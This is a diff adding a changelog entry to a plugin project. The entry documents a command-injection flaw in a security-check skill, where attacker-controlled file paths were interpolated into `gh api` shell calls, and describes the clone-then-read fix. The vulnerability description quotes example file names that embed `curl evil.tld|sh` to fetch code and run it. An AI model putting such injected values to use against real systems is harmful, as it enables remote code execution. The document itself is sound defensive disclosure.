@@ -6,6 +6,17 @@ Entries are reverse-chronological (newest first) and reference the merging PR + 
 
 ---
 
+## v0.50.4
+
+Replace `security-check/SKILL.md` Step 2's per-file `gh api` fetch recipe with mandatory clone-then-Read tool reads — closes #347.
+
+- **Gap closed** — Step 2's documented two-command recipe listed a candidate's files via the git trees API, then fetched each one with `gh api "repos/<owner>/<repo>/contents/<full-file-path>?ref=<commit-sha>"` — `<full-file-path>` taken verbatim from the candidate's own (attacker-controlled) tree listing. A git tree entry can contain almost any byte (only NUL is structurally forbidden), so a candidate could name a file `` `curl evil.tld|sh` `` or `$(curl evil.tld|sh)`; double-quoting does not stop command substitution, so the payload would execute the moment the constructed command line ran, before `gh api` itself. CWE-78 in the one gate meant to catch a malicious candidate before install.
+- **Fix** — Step 2 gained a new "How to fetch files" subsection, applying to all three candidate types (skill / agent / plugin), that replaces per-file `gh api` fetching with: validate `<owner>`/`<repo>`/`<commit-sha>` against the same allowlist `inspect/SKILL.md` (#348/v0.50.3) uses, shallow-clone the candidate once into `~/.ievo/checkouts/<owner>-<repo>/` (reusing a repo-indexer checkout if one exists — same convention as `scan_repo.mjs`), enumerate files with `find`, then read each one with the Read tool (`file_path` passed as a direct parameter, never a shell string — no candidate byte ever crosses a shell). No unsafe fallback: if cloning fails, the scan is reduced-coverage, not reverted to the vulnerable recipe. Added a corresponding invariant to the Rules section; `compatibility` frontmatter now notes the `git` requirement.
+- **Scope** — confined to `plugins/ievo/skills/security-check/SKILL.md`; a textual instruction constraint, no new script or tests required. Same root cause as #348 but a different mitigation shape (clone-based reads rather than an allowlist) — security-check already documented shallow-clone as a faster, rate-limit-avoiding alternative, and its Step 2 can read far more files per candidate (up to a full plugin) than inspect's curated fetch set, so mandatory cloning is the better fit here per the original issue's own recommendation #1.
+- **Version** — bump per AGENTS.md rules (`fix:` → patch, edits a plugin file under `plugins/ievo/**`); `discover.mjs` and `evolution_candidates.mjs` `SCRIPT_VERSION`, `plugin.json`, `marketplace.json`, and the AGENTS.md compliance ledger updated in lockstep. No `plugins/ievo/scripts/` logic change — the 100% coverage gate is untouched.
+
+---
+
 ## v0.50.3
 
 Validate `<ref>` and `<path>` against a strict allowlist before `inspect/SKILL.md` interpolates either into a `gh api` Bash call — closes #348.
